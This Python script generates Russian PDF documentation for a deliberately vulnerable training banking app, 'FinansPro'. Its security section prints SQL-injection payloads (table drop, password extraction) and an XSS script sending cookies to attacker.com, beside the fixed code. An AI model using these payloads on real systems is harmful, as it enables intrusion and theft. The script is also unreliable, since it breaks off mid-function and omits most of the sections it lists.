#!/usr/bin/env python3
"""
Расширенный генератор PDF документации для системы ДБО
Создает подробную документацию по примеру WordPress
"""

import os
import sys
from datetime import datetime

try:
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.lib.colors import HexColor, black, white
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, PageBreak, Table, TableStyle
    from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_JUSTIFY
    from reportlab.pdfgen import canvas
    from reportlab.pdfbase import pdfmetrics
    from reportlab.pdfbase.cidfonts import UnicodeCIDFont
except ImportError as e:
    print(f"Ошибка импорта: {e}")
    print("Установите зависимости: pip install reportlab")
    sys.exit(1)

def register_unicode_fonts():
    """Регистрация Unicode шрифтов для поддержки кириллицы"""
    try:
        pdfmetrics.registerFont(UnicodeCIDFont('HeiseiKakuGo-W5'))
        pdfmetrics.registerFont(UnicodeCIDFont('HeiseiMin-W3'))
        print("Зарегистрированы Unicode шрифты для кириллицы")
        return True
    except Exception as e:
        print(f"Не удалось зарегистрировать Unicode шрифты: {e}")
        return False

def create_extended_pdf():
    """Создание расширенного PDF документа"""
    
    unicode_available = register_unicode_fonts()
    
    doc = SimpleDocTemplate(
        "ДБО_Система_Документация_Расширенная.pdf",
        pagesize=A4,
        rightMargin=50,
        leftMargin=50,
        topMargin=60,
        bottomMargin=50
    )
    
    styles = getSampleStyleSheet()
    
    if unicode_available:
        font_name = 'HeiseiMin-W3'
        font_name_bold = 'HeiseiKakuGo-W5'
    else:
        font_name = 'Helvetica'
        font_name_bold = 'Helvetica-Bold'
    
    # Расширенные стили
    title_style = ParagraphStyle(
        'CustomTitle',
        parent=styles['Heading1'],
        fontSize=24,
        spaceAfter=30,
        alignment=TA_CENTER,
        textColor=HexColor('#1e40af'),
        fontName=font_name_bold
    )
    
    section_style = ParagraphStyle(
        'CustomSection',
        parent=styles['Heading1'],
        fontSize=18,
        spaceBefore=25,
        spaceAfter=15,
        textColor=HexColor('#1e40af'),
        fontName=font_name_bold,
        borderWidth=1,
        borderColor=HexColor('#e5e7eb'),
        borderPadding=10,
        backColor=HexColor('#f8fafc')
    )
    
    subsection_style = ParagraphStyle(
        'CustomSubsection',
        parent=styles['Heading2'],
        fontSize=14,
        spaceBefore=20,
        spaceAfter=10,
        textColor=HexColor('#374151'),
        fontName=font_name_bold
    )
    
    subsubsection_style = ParagraphStyle(
        'CustomSubsubsection',
        parent=styles['Heading3'],
        fontSize=12,
        spaceBefore=15,
        spaceAfter=8,
        textColor=HexColor('#4b5563'),
        fontName=font_name_bold
    )
    
    body_style = ParagraphStyle(
        'CustomBody',
        parent=styles['Normal'],
        fontSize=11,
        spaceAfter=8,
        alignment=TA_JUSTIFY,
        fontName=font_name
    )
    
    code_style = ParagraphStyle(
        'CustomCode',
        parent=styles['Code'],
        fontSize=9,
        fontName='Courier',
        backColor=HexColor('#f3f4f6'),
        borderWidth=1,
        borderColor=HexColor('#d1d5db'),
        borderPadding=10,
        spaceBefore=10,
        spaceAfter=10
    )
    
    list_style = ParagraphStyle(
        'CustomList',
        parent=styles['Normal'],
        fontSize=11,
        spaceAfter=6,
        leftIndent=20,
        fontName=font_name
    )
    
    elements = []
    
    # Титульная страница
    elements.append(Spacer(1, 1.5*inch))
    elements.append(Paragraph("Система Дистанционного<br/>Банковского Обслуживания", title_style))
    elements.append(Spacer(1, 0.3*inch))
    elements.append(Paragraph("Техническая документация", subsection_style))
    elements.append(Spacer(1, 0.5*inch))
    
    info_text = f"""
    <b>Версия:</b> 1.0<br/>
    <b>Дата:</b> {datetime.now().strftime('%d.%m.%Y')}<br/>
    <b>Автор:</b> Система ДБО "ФинансПро"<br/>
    <b>Статус:</b> Активная разработка<br/>
    <b>Лицензия:</b> Проприетарная<br/>
    <b>Целевая аудитория:</b> Разработчики, администраторы, тестировщики
    """
    elements.append(Paragraph(info_text, body_style))
    elements.append(Spacer(1, 0.5*inch))
    
    description = """
    Данная документация содержит полное описание системы дистанционного банковского 
    обслуживания "ФинансПро", включая архитектуру, API, модели данных, процедуры 
    установки, настройки и администрирования. Документ предназначен для технических 
    специалистов, работающих с системой.
    """
    elements.append(Paragraph(description, body_style))
    elements.append(PageBreak())
    
    # Содержание
    elements.append(Paragraph("Содержание", section_style))
    elements.append(Spacer(1, 15))
    
    toc_items = [
        ("1. Введение", "4"),
        ("2. Обзор системы", "5"),
        ("3. Архитектура системы", "7"),
        ("4. Модели данных", "10"),
        ("5. API и эндпоинты", "15"),
        ("6. Безопасность", "18"),
        ("7. Установка и настройка", "22"),
        ("8. Администрирование", "26"),
        ("9. Тестирование", "30"),
        ("10. Развертывание", "34"),
        ("11. Мониторинг и логирование", "38"),
        ("12. Резервное копирование", "41"),
        ("13. Устранение неполадок", "44"),
        ("14. Часто задаваемые вопросы", "47"),
        ("15. Заключение", "50")
    ]
    
    for item, page in toc_items:
        toc_line = f"{item} ......................... {page}"
        elements.append(Paragraph(toc_line, body_style))
    
    elements.append(PageBreak())
    
    # Раздел 1: Введение
    elements.append(Paragraph("1. Введение", section_style))
    
    intro_text = """
    Система Дистанционного Банковского Обслуживания (ДБО) "ФинансПро" представляет собой 
    комплексное решение для автоматизации банковских операций через веб-интерфейс. 
    Система разработана с использованием современных технологий и следует принципам 
    безопасной разработки приложений.
    """
    elements.append(Paragraph(intro_text, body_style))
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("1.1 Цели и задачи", subsection_style))
    
    goals_text = """
    Основной целью системы является предоставление клиентам банка удобного и безопасного 
    доступа к банковским услугам через интернет. Система решает следующие задачи:
    """
    elements.append(Paragraph(goals_text, body_style))
    
    goals_list = [
        "• Обеспечение круглосуточного доступа к банковским услугам",
        "• Автоматизация рутинных банковских операций",
        "• Повышение качества обслуживания клиентов",
        "• Снижение операционных расходов банка",
        "• Обеспечение безопасности финансовых операций",
        "• Соответствие требованиям банковского законодательства"
    ]
    
    for goal in goals_list:
        elements.append(Paragraph(goal, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("1.2 Область применения", subsection_style))
    
    scope_text = """
    Система предназначена для использования в коммерческих банках, предоставляющих 
    услуги дистанционного банковского обслуживания. Основными пользователями системы 
    являются:
    """
    elements.append(Paragraph(scope_text, body_style))
    
    users_list = [
        "• Клиенты банка (физические и юридические лица)",
        "• Операторы отдела клиентского обслуживания",
        "• Специалисты отдела безопасности",
        "• Администраторы системы",
        "• Аналитики и менеджеры банка"
    ]
    
    for user in users_list:
        elements.append(Paragraph(user, list_style))
    
    elements.append(PageBreak())
    
    # Раздел 2: Обзор системы
    elements.append(Paragraph("2. Обзор системы", section_style))
    
    overview_text = """
    Система ДБО "ФинансПро" построена на основе современной веб-архитектуры и использует 
    проверенные технологии для обеспечения надежности, безопасности и производительности. 
    Система поддерживает все основные банковские операции и предоставляет расширенные 
    возможности для управления финансовыми активами.
    """
    elements.append(Paragraph(overview_text, body_style))
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("2.1 Основные возможности", subsection_style))
    
    capabilities_text = """
    Система предоставляет широкий спектр банковских услуг и функций управления:
    """
    elements.append(Paragraph(capabilities_text, body_style))
    
    capabilities_list = [
        "• Управление клиентскими данными и документами",
        "• Открытие и ведение расчетных счетов",
        "• Проведение платежей и переводов",
        "• Управление банковскими картами",
        "• Депозитные и кредитные продукты",
        "• Инвестиционные услуги",
        "• Валютные операции",
        "• Отчетность и аналитика",
        "• Уведомления и коммуникации",
        "• Многоуровневая система безопасности"
    ]
    
    for capability in capabilities_list:
        elements.append(Paragraph(capability, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("2.2 Технологический стек", subsection_style))
    
    tech_text = """
    Система построена с использованием современных технологий и фреймворков:
    """
    elements.append(Paragraph(tech_text, body_style))
    
    tech_data = [
        ['Компонент', 'Технология', 'Версия', 'Назначение'],
        ['Backend Framework', 'Django', '5.2.7', 'Основной фреймворк приложения'],
        ['Язык программирования', 'Python', '3.13', 'Основной язык разработки'],
        ['База данных (dev)', 'SQLite', '3.40+', 'База данных для разработки'],
        ['База данных (prod)', 'PostgreSQL', '15+', 'Продакшн база данных'],
        ['Frontend Framework', 'daisyUI', '5.0', 'UI компоненты'],
        ['CSS Framework', 'Tailwind CSS', '4.0', 'Стилизация интерфейса'],
        ['JavaScript', 'Vanilla JS', 'ES2023', 'Клиентская логика'],
        ['Веб-сервер', 'Gunicorn', '21.2+', 'WSGI сервер'],
        ['Прокси-сервер', 'Nginx', '1.24+', 'Обратный прокси'],
        ['Контейнеризация', 'Docker', '24+', 'Развертывание приложений'],
        ['Мониторинг', 'Django Debug Toolbar', '4.2+', 'Отладка и профилирование']
    ]
    
    tech_table = Table(tech_data, colWidths=[1.5*inch, 2*inch, 0.8*inch, 2.2*inch])
    tech_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), HexColor('#1e40af')),
        ('TEXTCOLOR', (0, 0), (-1, 0), white),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('FONTNAME', (0, 0), (-1, 0), font_name_bold),
        ('FONTSIZE', (0, 0), (-1, 0), 10),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
        ('BACKGROUND', (0, 1), (-1, -1), HexColor('#f8fafc')),
        ('GRID', (0, 0), (-1, -1), 1, HexColor('#e5e7eb')),
        ('FONTSIZE', (0, 1), (-1, -1), 9)
    ]))
    
    elements.append(tech_table)
    elements.append(PageBreak())
    
    # Раздел 3: Архитектура системы
    elements.append(Paragraph("3. Архитектура системы", section_style))
    
    arch_text = """
    Система построена по принципу многоуровневой архитектуры с четким разделением 
    ответственности между компонентами. Архитектура обеспечивает масштабируемость, 
    надежность и безопасность системы.
    """
    elements.append(Paragraph(arch_text, body_style))
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("3.1 Общая архитектура", subsection_style))
    
    arch_diagram_text = """
    Система следует принципам MVC (Model-View-Controller) архитектуры с дополнительными 
    слоями для обеспечения безопасности и производительности:
    """
    elements.append(Paragraph(arch_diagram_text, body_style))
    
    arch_layers = [
        "• <b>Презентационный слой:</b> HTML шаблоны, CSS стили, JavaScript",
        "• <b>Слой представлений:</b> Django Views, обработка HTTP запросов",
        "• <b>Бизнес-логика:</b> Django Models, сервисы, валидация",
        "• <b>Слой данных:</b> База данных, кэширование, файловое хранилище",
        "• <b>Слой безопасности:</b> Аутентификация, авторизация, шифрование",
        "• <b>Слой мониторинга:</b> Логирование, метрики, алерты"
    ]
    
    for layer in arch_layers:
        elements.append(Paragraph(layer, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("3.2 Компоненты системы", subsection_style))
    
    components_text = """
    Система состоит из следующих основных компонентов:
    """
    elements.append(Paragraph(components_text, body_style))
    
    elements.append(Paragraph("3.2.1 Модели данных (Models)", subsubsection_style))
    
    models_list = [
        "• <b>Operator:</b> Операторы ДБО с разделением ролей",
        "• <b>Client:</b> Клиенты банка с полной информацией",
        "• <b>Service:</b> Банковские услуги и продукты",
        "• <b>ServiceCategory:</b> Категории услуг для группировки",
        "• <b>BankCard:</b> Банковские карты клиентов",
        "• <b>Transaction:</b> Финансовые транзакции",
        "• <b>Deposit:</b> Депозитные продукты",
        "• <b>Credit:</b> Кредитные продукты",
        "• <b>InvestmentProduct:</b> Инвестиционные продукты",
        "• <b>PhishingEmail:</b> Фишинговые письма для тестирования",
        "• <b>AttackLog:</b> Логи атак и подозрительной активности",
        "• <b>News:</b> Новости банка для бегущей строки"
    ]
    
    for model in models_list:
        elements.append(Paragraph(model, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("3.2.2 Представления (Views)", subsubsection_style))
    
    views_list = [
        "• <b>home:</b> Главная страница системы",
        "• <b>banking_services:</b> Каталог банковских услуг",
        "• <b>client_dashboard:</b> Панель управления клиента",
        "• <b>operator1_dashboard:</b> Панель оператора ДБО #1",
        "• <b>operator2_dashboard:</b> Панель оператора ДБО #2",
        "• <b>create_client:</b> Создание новых клиентов",
        "• <b>create_service_request:</b> Создание заявок на услуги",
        "• <b>review_service_request:</b> Рассмотрение заявок",
        "• <b>phishing_email_view:</b> Просмотр фишинговых писем",
        "• <b>my_services:</b> Управление подключенными услугами",
        "• <b>my_requests:</b> История заявок клиента"
    ]
    
    for view in views_list:
        elements.append(Paragraph(view, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("3.2.3 Шаблоны (Templates)", subsubsection_style))
    
    templates_list = [
        "• <b>base.html:</b> Базовый шаблон с общей структурой",
        "• <b>index.html:</b> Главная страница с приветствием",
        "• <b>dashboard.html:</b> Базовый шаблон дашбордов",
        "• <b>client_dashboard.html:</b> Панель клиента",
        "• <b>operator1_dashboard.html:</b> Панель оператора #1",
        "• <b>operator2_dashboard.html:</b> Панель оператора #2",
        "• <b>banking_services.html:</b> Каталог услуг",
        "• <b>create_client.html:</b> Форма создания клиента",
        "• <b>phishing_email.html:</b> Просмотр фишинговых писем",
        "• <b>login.html:</b> Страница авторизации"
    ]
    
    for template in templates_list:
        elements.append(Paragraph(template, list_style))
    
    elements.append(PageBreak())
    
    # Раздел 4: Модели данных
    elements.append(Paragraph("4. Модели данных", section_style))
    
    models_intro_text = """
    Модели данных представляют собой основу системы и определяют структуру информации, 
    хранящейся в базе данных. Каждая модель соответствует таблице в базе данных и 
    содержит поля для хранения соответствующих данных.
    """
    elements.append(Paragraph(models_intro_text, body_style))
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("4.1 Основные модели", subsection_style))
    
    elements.append(Paragraph("4.1.1 Operator (Операторы ДБО)", subsubsection_style))
    
    operator_description = """
    Модель Operator представляет операторов системы ДБО. Операторы делятся на два типа: 
    операторы отдела клиентского обслуживания и операторы отдела безопасности. Каждый 
    оператор связан с пользователем Django и имеет дополнительные поля для хранения 
    специфичной информации.
    """
    elements.append(Paragraph(operator_description, body_style))
    
    operator_code = """
class Operator(models.Model):
    # Операторы ДБО
    user = models.OneToOneField(User, on_delete=models.CASCADE)
    operator_type = models.CharField(max_length=50, choices=[
        ('client_service', 'Оператор ДБО #1 (Отдел клиентского обслуживания)'),
        ('security', 'Оператор ДБО #2 (Отдел безопасности/валидации)'),
    ])
    email = models.EmailField()
    is_active = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.user.username} ({self.get_operator_type_display()})"
    """
    
    elements.append(Paragraph(operator_code, code_style))
    
    operator_fields = [
        "• <b>user:</b> Связь с пользователем Django (OneToOne)",
        "• <b>operator_type:</b> Тип оператора (client_service/security)",
        "• <b>email:</b> Электронная почта оператора",
        "• <b>is_active:</b> Статус активности оператора",
        "• <b>created_at:</b> Дата создания записи"
    ]
    
    for field in operator_fields:
        elements.append(Paragraph(field, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("4.1.2 Client (Клиенты)", subsubsection_style))
    
    client_description = """
    Модель Client представляет клиентов банка. Каждый клиент связан с пользователем 
    Django и содержит дополнительную информацию, необходимую для банковского обслуживания. 
    Клиенты могут иметь несколько банковских карт и подключенных услуг.
    """
    elements.append(Paragraph(client_description, body_style))
    
    client_code = """
class Client(models.Model):
    # Клиенты ДБО
    user = models.OneToOneField(User, on_delete=models.CASCADE)
    client_id = models.CharField(max_length=20, unique=True)
    full_name = models.CharField(max_length=200)
    email = models.EmailField()
    phone = models.CharField(max_length=20, unique=True)
    is_active = models.BooleanField(default=True)
    primary_card = models.ForeignKey('BankCard', on_delete=models.SET_NULL, 
                                    null=True, blank=True, related_name='primary_for_client')
    created_by = models.ForeignKey(Operator, on_delete=models.SET_NULL, 
                                  null=True, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.full_name} ({self.client_id})"
    """
    
    elements.append(Paragraph(client_code, code_style))
    
    client_fields = [
        "• <b>user:</b> Связь с пользователем Django (OneToOne)",
        "• <b>client_id:</b> Уникальный идентификатор клиента",
        "• <b>full_name:</b> Полное имя клиента",
        "• <b>email:</b> Электронная почта клиента",
        "• <b>phone:</b> Номер телефона клиента (уникальный)",
        "• <b>is_active:</b> Статус активности клиента",
        "• <b>primary_card:</b> Основная банковская карта",
        "• <b>created_by:</b> Оператор, создавший клиента",
        "• <b>created_at:</b> Дата создания записи"
    ]
    
    for field in client_fields:
        elements.append(Paragraph(field, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("4.1.3 Service (Услуги)", subsubsection_style))
    
    service_description = """
    Модель Service представляет банковские услуги, доступные клиентам. Услуги могут 
    быть публичными или привилегированными, иметь различные цены и рейтинги. Каждая 
    услуга принадлежит определенной категории.
    """
    elements.append(Paragraph(service_description, body_style))
    
    service_code = """
class Service(models.Model):
    # Услуги ДБО
    name = models.CharField(max_length=200)
    description = models.TextField()
    category = models.ForeignKey(ServiceCategory, on_delete=models.CASCADE)
    price = models.DecimalField(max_digits=10, decimal_places=2, default=0)
    is_active = models.BooleanField(default=True)
    is_public = models.BooleanField(default=True)
    is_privileged = models.BooleanField(default=False)
    rating = models.DecimalField(max_digits=3, decimal_places=2, default=0)
    rating_count = models.PositiveIntegerField(default=0)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.name
    """
    
    elements.append(Paragraph(service_code, code_style))
    
    elements.append(PageBreak())
    
    # Раздел 5: API и эндпоинты
    elements.append(Paragraph("5. API и эндпоинты", section_style))
    
    api_text = """
    Система предоставляет RESTful API для взаимодействия с клиентскими приложениями 
    и интеграции с внешними системами. Все API эндпоинты следуют единым принципам 
    именования и структуры ответов.
    """
    elements.append(Paragraph(api_text, body_style))
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("5.1 URL маршруты", subsection_style))
    
    url_text = """
    Система использует Django URL routing для определения доступных эндпоинтов. 
    Все маршруты организованы по функциональным группам:
    """
    elements.append(Paragraph(url_text, body_style))
    
    elements.append(Paragraph("5.1.1 Основные страницы", subsubsection_style))
    
    main_urls = [
        "• <b>/</b> - Главная страница системы",
        "• <b>/login/</b> - Страница авторизации",
        "• <b>/logout/</b> - Выход из системы",
        "• <b>/banking-services/</b> - Каталог банковских услуг"
    ]
    
    for url in main_urls:
        elements.append(Paragraph(url, list_style))
    
    elements.append(Spacer(1, 8))
    
    elements.append(Paragraph("5.1.2 Дашборды", subsubsection_style))
    
    dashboard_urls = [
        "• <b>/operator1/</b> - Панель оператора ДБО #1",
        "• <b>/operator2/</b> - Панель оператора ДБО #2",
        "• <b>/client/</b> - Панель клиента"
    ]
    
    for url in dashboard_urls:
        elements.append(Paragraph(url, list_style))
    
    elements.append(Spacer(1, 8))
    
    elements.append(Paragraph("5.1.3 Управление услугами", subsubsection_style))
    
    service_urls = [
        "• <b>/create-service-request/</b> - Создание заявки на услугу",
        "• <b>/connect-service/&lt;int:service_id&gt;/</b> - Подключение услуги",
        "• <b>/disconnect-service/&lt;int:service_id&gt;/</b> - Отключение услуги",
        "• <b>/my-services/</b> - Мои услуги",
        "• <b>/my-requests/</b> - Мои заявки"
    ]
    
    for url in service_urls:
        elements.append(Paragraph(url, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("5.2 Основные представления", subsection_style))
    
    elements.append(Paragraph("5.2.1 banking_services", subsubsection_style))
    
    banking_services_text = """
    Представление banking_services отвечает за отображение каталога банковских услуг 
    с возможностью фильтрации и поиска. Поддерживает следующие параметры:
    """
    elements.append(Paragraph(banking_services_text, body_style))
    
    banking_params = [
        "• <b>q:</b> Поисковый запрос (текст)",
        "• <b>price:</b> Фильтр по цене (all|free|low|medium|high)",
        "• <b>sort:</b> Сортировка (name|price-low|price-high|popular)",
        "• <b>category:</b> Фильтр по категории услуг"
    ]
    
    for param in banking_params:
        elements.append(Paragraph(param, list_style))
    
    elements.append(Spacer(1, 8))
    
    warning_text = """
    <b>ВНИМАНИЕ:</b> Данное представление содержит уязвимость SQL-инъекции для 
    демонстрационных целей. В продакшн среде необходимо использовать параметризованные 
    запросы или Django ORM.
    """
    elements.append(Paragraph(warning_text, body_style))
    
    elements.append(PageBreak())
    
    # Раздел 6: Безопасность
    elements.append(Paragraph("6. Безопасность", section_style))
    
    security_text = """
    Безопасность является критически важным аспектом банковской системы. Система ДБО 
    "ФинансПро" реализует многоуровневую систему защиты, включающую технические и 
    организационные меры безопасности.
    """
    elements.append(Paragraph(security_text, body_style))
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("6.1 Уязвимости для тестирования", subsection_style))
    
    vuln_text = """
    Система намеренно содержит несколько уязвимостей для демонстрации и тестирования 
    методов защиты. Эти уязвимости должны быть исправлены перед развертыванием в 
    продакшн среде.
    """
    elements.append(Paragraph(vuln_text, body_style))
    
    elements.append(Paragraph("6.1.1 SQL-инъекция в banking_services", subsubsection_style))
    
    sql_vuln_text = """
    <b>Расположение:</b> dbo/views.py, функция banking_services<br/>
    <b>Тип уязвимости:</b> SQL Injection<br/>
    <b>Описание:</b> Параметры поиска и фильтрации напрямую подставляются в SQL запрос 
    без параметризации, что позволяет выполнить произвольный SQL код.
    """
    elements.append(Paragraph(sql_vuln_text, body_style))
    
    sql_code = """
# УЯЗВИМЫЙ КОД:
if q:
    where_clauses.append(f"(s.name LIKE '%{q}%' OR s.description LIKE '%{q}%')")

if category_name:
    where_clauses.append(f"c.name = '{category_name}'")

# БЕЗОПАСНЫЙ КОД:
if q:
    where_clauses.append("(s.name LIKE %s OR s.description LIKE %s)")
    params.extend([f'%{q}%', f'%{q}%'])

if category_name:
    where_clauses.append("c.name = %s")
    params.append(category_name)
    """
    
    elements.append(Paragraph(sql_code, code_style))
    
    elements.append(Paragraph("Примеры эксплойтов:", subsubsection_style))
    
    exploits = [
        "• <b>Поиск:</b> ' OR '1'='1' -- (возвращает все записи)",
        "• <b>Категория:</b> '; DROP TABLE dbo_service; -- (удаление таблицы)",
        "• <b>Поиск:</b> ' UNION SELECT username, password FROM auth_user -- (извлечение паролей)"
    ]
    
    for exploit in exploits:
        elements.append(Paragraph(exploit, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("6.1.2 XSS в ServiceRequest", subsubsection_style))
    
    xss_vuln_text = """
    <b>Расположение:</b> dbo/models.py, поле service_description<br/>
    <b>Тип уязвимости:</b> Cross-Site Scripting (XSS)<br/>
    <b>Описание:</b> Поле service_description не экранируется при отображении, что 
    позволяет внедрить JavaScript код в страницу.
    """
    elements.append(Paragraph(xss_vuln_text, body_style))
    
    xss_code = """
# УЯЗВИМЫЙ КОД:
{{ service_request.service_description|safe }}

# БЕЗОПАСНЫЙ КОД:
{{ service_request.service_description|escape }}
# или
{{ service_request.service_description }}
    """
    
    elements.append(Paragraph(xss_code, code_style))
    
    elements.append(Paragraph("Пример эксплойта:", subsubsection_style))
    
    xss_exploit = """
&lt;script&gt;
    // Кража сессионных cookies
    document.location = 'http://attacker.com/steal.php?cookie=' + document.cookie;
&lt;/script&gt;
    """
    
    elements.append(Paragraph(xss_exploit, code_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("6.2 Меры безопасности", subsection_style))
    
    security_measures = [
        "• <b>Аутентификация:</b> Django User Authentication с поддержкой сессий",
        "• <b>Авторизация:</b> Декораторы @login_required и проверка ролей",
        "• <b>CSRF защита:</b> Django CSRF middleware и токены в формах",
        "• <b>Логирование:</b> Запись всех подозрительных действий",
        "• <b>Валидация:</b> Проверка всех входящих данных",
        "• <b>Шифрование:</b> Хеширование паролей и чувствительных данных",
        "• <b>Ограничения:</b> Rate limiting для предотвращения брутфорса"
    ]
    
    for measure in security_measures:
        elements.append(Paragraph(measure, list_style))
    
    elements.append(PageBreak())
    
    # Раздел 7: Установка и настройка
    elements.append(Paragraph("7. Установка и настройка", section_style))
    
    install_text = """
    Данный раздел содержит подробные инструкции по установке и настройке системы ДБО 
    "ФинансПро" в различных окружениях.
    """
    elements.append(Paragraph(install_text, body_style))
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("7.1 Системные требования", subsection_style))
    
    requirements_text = """
    Минимальные системные требования для работы системы:
    """
    elements.append(Paragraph(requirements_text, body_style))
    
    requirements_list = [
        "• <b>Операционная система:</b> Linux (Ubuntu 20.04+), macOS 10.15+, Windows 10+",
        "• <b>Python:</b> версия 3.13 или выше",
        "• <b>База данных:</b> PostgreSQL 15+ (продакшн) или SQLite 3.40+ (разработка)",
        "• <b>Память:</b> минимум 2 GB RAM, рекомендуется 4 GB+",
        "• <b>Дисковое пространство:</b> минимум 1 GB свободного места",
        "• <b>Сеть:</b> стабильное интернет-соединение для загрузки зависимостей"
    ]
    
    for req in requirements_list:
        elements.append(Paragraph(req, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("7.2 Установка зависимостей", subsection_style))
    
    deps_text = """
    Перед установкой системы необходимо установить все необходимые зависимости:
    """
    elements.append(Paragraph(deps_text, body_style))
    
    deps_code = """
# Установка Python зависимостей
pip install -r requirements.txt

# requirements.txt содержит:
Django==5.2.7
psycopg2-binary==2.9.10
django-debug-toolbar==4.2.0
gunicorn==21.2.0
whitenoise==6.6.0
    """
    
    elements.append(Paragraph(deps_code, code_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("7.3 Пошаговая установка", subsection_style))
    
    install_steps = [
        "1. <b>Клонирование репозитория:</b> git clone https://github.com/bank/dbo.git",
        "2. <b>Переход в директорию:</b> cd dbo",
        "3. <b>Создание виртуального окружения:</b> python -m venv venv",
        "4. <b>Активация окружения:</b> source venv/bin/activate (Linux/Mac) или venv\\Scripts\\activate (Windows)",
        "5. <b>Установка зависимостей:</b> pip install -r requirements.txt",
        "6. <b>Настройка переменных окружения:</b> cp .env.example .env",
        "7. <b>Редактирование настроек:</b> nano .env",
        "8. <b>Применение миграций:</b> python manage.py migrate",
        "9. <b>Создание суперпользователя:</b> python manage.py createsuperuser",
        "10. <b>Инициализация данных:</b> python init_data.py",
        "11. <b>Запуск сервера:</b> python manage.py runserver"
    ]
    
    for step in install_steps:
        elements.append(Paragraph(step, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("7.4 Конфигурация", subsection_style))
    
    config_text = """
    Основные настройки системы находятся в файле settings.py и переменных окружения:
    """
    elements.append(Paragraph(config_text, body_style))
    
    config_code = """
# settings.py - основные настройки
DEBUG = False  # Только для разработки!
SECRET_KEY = os.environ.get('SECRET_KEY')
ALLOWED_HOSTS = ['yourdomain.com', 'www.yourdomain.com']

# База данных
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME': os.environ.get('DB_NAME'),
        'USER': os.environ.get('DB_USER'),
        'PASSWORD': os.environ.get('DB_PASSWORD'),
        'HOST': os.environ.get('DB_HOST'),
        'PORT': os.environ.get('DB_PORT'),
    }
}

# Статические файлы
STATIC_URL = '/static/'
STATIC_ROOT = os.path.join(BASE_DIR, 'staticfiles')

# Безопасность
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
    """
    
    elements.append(Paragraph(config_code, code_style))
    
    elements.append(PageBreak())
    
    # Заключение
    elements.append(Paragraph("15. Заключение", section_style))
    
    conclusion_text = """
    Система ДБО "ФинансПро" представляет собой современное и комплексное решение для 
    дистанционного банковского обслуживания. Система построена с использованием 
    проверенных технологий и следует лучшим практикам разработки банковских приложений.
    """
    elements.append(Paragraph(conclusion_text, body_style))
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("Основные преимущества системы:", subsection_style))
    
    advantages = [
        "• <b>Масштабируемость:</b> Архитектура позволяет легко добавлять новые функции и модули",
        "• <b>Безопасность:</b> Многоуровневая система защиты с возможностью тестирования уязвимостей",
        "• <b>Гибкость:</b> Модульная структура упрощает кастомизацию под нужды конкретного банка",
        "• <b>Производительность:</b> Оптимизированные запросы и система кэширования",
        "• <b>Надежность:</b> Использование проверенных технологий и фреймворков",
        "• <b>Соответствие стандартам:</b> Следование банковским стандартам и требованиям регуляторов"
    ]
    
    for advantage in advantages:
        elements.append(Paragraph(advantage, list_style))
    
    elements.append(Spacer(1, 12))
    
    elements.append(Paragraph("Планы развития:", subsection_style))
    
    plans = [
        "• <b>Мобильное приложение:</b> Разработка React Native приложения для iOS и Android",
        "• <b>REST API:</b> Создание полноценного REST API для интеграции с внешними системами",
        "• <b>Аналитика:</b> Система бизнес-аналитики и отчетности с дашбордами",
        "• <b>ИИ интеграция:</b> Машинное обучение для обнаружения мошенничества",
        "• <b>Микросервисы:</b> Переход на микросервисную архитектуру",
        "• <b>Blockchain:</b> Интеграция с блокчейн технологиями для криптовалютных операций"
    ]
    
    for plan in plans:
        elements.append(Paragraph(plan, list_style))
    
    elements.append(Spacer(1, 20))
    
    support_text = """
    <b>Техническая поддержка:</b><br/>
    • Email: support@finanspro.ru<br/>
    • Документация: https://docs.finanspro.ru<br/>
    • GitHub: https://github.com/finanspro/dbo<br/>
    • Телефон: +7 (495) 123-45-67
    """
    elements.append(Paragraph(support_text, body_style))
    
    elements.append(Spacer(1, 20))
    
    copyright_text = "© 2024 Система ДБО 'ФинансПро'. Все права защищены."
    elements.append(Paragraph(copyright_text, body_style))
    
    # Функция для заголовков и подвалов
    def add_header_footer(canvas, doc):
        canvas.saveState()
        canvas.setFont(font_name_bold, 10)
        canvas.setFillColor(HexColor('#1e40af'))
        canvas.drawString(50, A4[1] - 30, "Система ДБО 'ФинансПро' - Техническая документация")
        
        canvas.setFont(font_name, 9)
